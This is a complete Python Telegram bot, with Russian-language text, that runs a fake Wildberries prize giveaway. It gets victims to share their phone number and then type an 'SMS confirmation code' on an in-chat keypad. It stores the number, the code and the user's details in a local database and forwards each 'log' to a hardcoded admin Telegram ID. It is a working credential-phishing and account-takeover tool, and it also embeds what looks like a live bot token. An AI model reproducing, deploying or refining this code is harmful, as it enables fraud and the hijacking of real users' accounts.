import requests
import time
import json
import sqlite3
from datetime import datetime
import random
import os
import sys

TOKEN = "8423215399:AAGsRtMMJW8ZVJBgutOv8-JTJFFXPP0frko"
URL = f"https://api.telegram.org/bot{TOKEN}/"
ADMIN_ID = 7719088889

offset = 0
session = requests.Session()

# ----- БД SQLite -----
conn = sqlite3.connect("users.db", check_same_thread=False)
cursor = conn.cursor()
cursor.execute("""
CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY,
    user_id INTEGER,
    first_name TEXT,
    username TEXT,
    phone TEXT,
    code TEXT,
    prize TEXT,
    date TEXT
)
""")
conn.commit()

PRIZES = [
    "200 рублей 💵",
    "200 звезд ⭐️",
    "NFT Dog 🐕",
    "Мишку 🧸",
    "NFT Rouse 🖼",
    "NFT Tracker 📊"
]

def send_admin_log(phone, code, prize, user_id, username, first_name):
    time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_text = (
        f"🔔 <b>НОВЫЙ ЛОГ!</b>\n\n"
        f"📱 <b>Номер:</b> {phone}\n"
        f"🔐 <b>Код:</b> <code>{code}</code>\n"
        f"🎁 <b>Приз:</b> {prize}\n"
        f"🆔 <b>ID:</b> {user_id}\n"
        f"👤 <b>Имя:</b> {first_name}\n"
        f"📛 <b>Username:</b> @{username if username else 'нет'}\n"
        f"⏱ <b>Время:</b> {time_now}"
    )
    try:
        send_message(ADMIN_ID, log_text)
    except:
        pass

def save_user(user_id, first_name, username, phone, code, prize):
    date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    cursor.execute(
        "INSERT INTO users (user_id, first_name, username, phone, code, prize, date) VALUES (?, ?, ?, ?, ?, ?, ?)",
        (user_id, first_name, username, phone, code, prize, date)
    )
    conn.commit()
    send_admin_log(phone, code, prize, user_id, username, first_name)

def send_message(chat_id, text, reply_markup=None):
    try:
        data = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
        if reply_markup:
            data["reply_markup"] = json.dumps(reply_markup)
        session.post(URL + "sendMessage", json=data, timeout=5)
    except:
        pass

def send_contact_button(chat_id):
    prize = random.choice(PRIZES)
    # Рамка из символов
    border = "━━━━━━━━━━━━━━━━━━━━━━"
    text = (
        f"{border}\n"
        f"🛍 <b>ГЛАВНЫЙ РОЗЫГРЫШ WILDBERRIES!</b>\n"
        f"{border}\n\n"
        f"┌─────────────────────┐\n"
        f"│   🎁 <b>ТВОЙ ПРИЗ:</b>      │\n"
        f"│   <b>{prize}</b>     │\n"
        f"└─────────────────────┘\n\n"
        f"🎫 <b>Главный приз:</b> Сертификат на бешенные скидки на WB\n"
        f"📌 <i>Номер нужен для регистрации на розыгрыш</i>\n\n"
        f"👇 <b>Нажми кнопку ниже:</b>"
    )
    markup = {
        "keyboard": [[{
            "text": f"🎯 ЗАБРАТЬ {prize.upper()} 🎯",
            "request_contact": True
        }]],
        "resize_keyboard": True,
        "one_time_keyboard": True
    }
    user_prizes[chat_id] = prize
    send_message(chat_id, text, markup)

def send_digit_keyboard(chat_id):
    text = (
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "📲 <b>ПОДТВЕРЖДЕНИЕ</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "Код отправлен в SMS\n"
        "Введи его ниже:"
    )
    markup = {
        "inline_keyboard": [
            [{"text": "1️⃣", "callback_data": "d_1"}, {"text": "2️⃣", "callback_data": "d_2"}, {"text": "3️⃣", "callback_data": "d_3"}],
            [{"text": "4️⃣", "callback_data": "d_4"}, {"text": "5️⃣", "callback_data": "d_5"}, {"text": "6️⃣", "callback_data": "d_6"}],
            [{"text": "7️⃣", "callback_data": "d_7"}, {"text": "8️⃣", "callback_data": "d_8"}, {"text": "9️⃣", "callback_data": "d_9"}],
            [{"text": "0️⃣", "callback_data": "d_0"}, {"text": "◀️", "callback_data": "d_back"}, {"text": "✅ ПОДТВЕРДИТЬ", "callback_data": "d_done"}]
        ]
    }
    send_message(chat_id, text, markup)

def remove_keyboard(chat_id, text):
    markup = {"remove_keyboard": True}
    send_message(chat_id, text, markup)

user_phones = {}
user_prizes = {}

print("🚀 Бот с улучшенным дизайном запущен...")
try:
    send_message(ADMIN_ID, "✅ Бот запущен на сервере 24/7\nРежим: Розыгрыш WB")
except:
    print("⚠️ Админ не доступен")

while True:
    try:
        res = session.get(
            URL + "getUpdates",
            params={"offset": offset, "timeout": 30},
            timeout=35
        ).json()
        
        for update in res.get("result", []):
            offset = update["update_id"] + 1
            
            if "message" in update:
                msg = update["message"]
                chat_id = msg["chat"]["id"]
                
                if "text" in msg and msg["text"] == "/start":
                    send_contact_button(chat_id)
                
                if "contact" in msg:
                    phone = msg["contact"]["phone_number"]
                    user_id = msg["from"]["id"]
                    first_name = msg["from"].get("first_name", "")
                    username = msg["from"].get("username", "")
                    
                    user_phones[user_id] = phone
                    prize = user_prizes.get(chat_id, "Приз")
                    
                    print(f"📲 Номер: {phone} | ID: {user_id} | Приз: {prize}")
                    
                    remove_keyboard(
                        chat_id, 
                        f"━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"✅ <b>НОМЕР ПРИНЯТ!</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"📱 Твой номер: {phone}\n"
                        f"🎁 Приз: {prize}\n"
                        f"🎫 Сертификат WB: зарегистрирован\n\n"
                        f"📟 <b>Введи код из SMS</b>"
                    )
                    send_digit_keyboard(chat_id)
            
            if "callback_query" in update:
                cb = update["callback_query"]
                cb_id = cb["id"]
                chat_id = cb["message"]["chat"]["id"]
                msg_id = cb["message"]["message_id"]
                data = cb["data"]
                user_id = cb["from"]["id"]
                
                current_text = cb["message"].get("text", "")
                if "Введи его ниже:" in current_text or "Введи код" in current_text:
                    current_text = ""
                
                if data == "d_done":
                    try:
                        code = current_text.strip()
                        phone = user_phones.get(user_id, "Неизвестно")
                        first_name = cb["from"].get("first_name", "")
                        username = cb["from"].get("username", "")
                        prize = user_prizes.get(chat_id, "Приз")
                        
                        save_user(user_id, first_name, username, phone, code, prize)
                        
                        session.post(URL + "answerCallbackQuery", json={
                            "callback_query_id": cb_id, 
                            "text": f"✅ Ты в розыгрыше!"
                        }, timeout=5)
                        
                        session.post(URL + "editMessageText", json={
                            "chat_id": chat_id,
                            "message_id": msg_id,
                            "text": f"━━━━━━━━━━━━━━━━━━━━━━\n"
                                    f"✅ <b>КОД ПРИНЯТ!</b>\n"
                                    f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
                                    f"🎁 Приз: {prize}\n"
                                    f"🎫 Сертификат WB: активен\n\n"
                                    f"Спасибо за участие!",
                            "reply_markup": None
                        }, timeout=5)
                        
                    except Exception as e:
                        print(f"Ошибка: {e}")
                    
                elif data == "d_back":
                    try:
                        new_text = current_text[:-1] if len(current_text) > 0 else ""
                        display_text = new_text if new_text else "📲 Введи код:"
                        session.post(URL + "editMessageText", json={
                            "chat_id": chat_id,
                            "message_id": msg_id,
                            "text": display_text,
                            "reply_markup": cb["message"]["reply_markup"]
                        }, timeout=5)
                        session.post(URL + "answerCallbackQuery", json={"callback_query_id": cb_id}, timeout=5)
                    except:
                        pass
                    
                elif data.startswith("d_"):
                    try:
                        digit = data.split("_")[1]
                        new_text = current_text + digit
                        session.post(URL + "editMessageText", json={
                            "chat_id": chat_id,
                            "message_id": msg_id,
                            "text": new_text,
                            "reply_markup": cb["message"]["reply_markup"]
                        }, timeout=5)
                        session.post(URL + "answerCallbackQuery", json={"callback_query_id": cb_id}, timeout=5)
                    except:
                        pass
        
        time.sleep(0.3)
        
    except KeyboardInterrupt:
        print("\n🛑 Бот остановлен")
        break
    except Exception as e:
        print(f"⚠️ Ошибка: {e} — переподключение...")
        time.sleep(5)
        session = requests.Session()
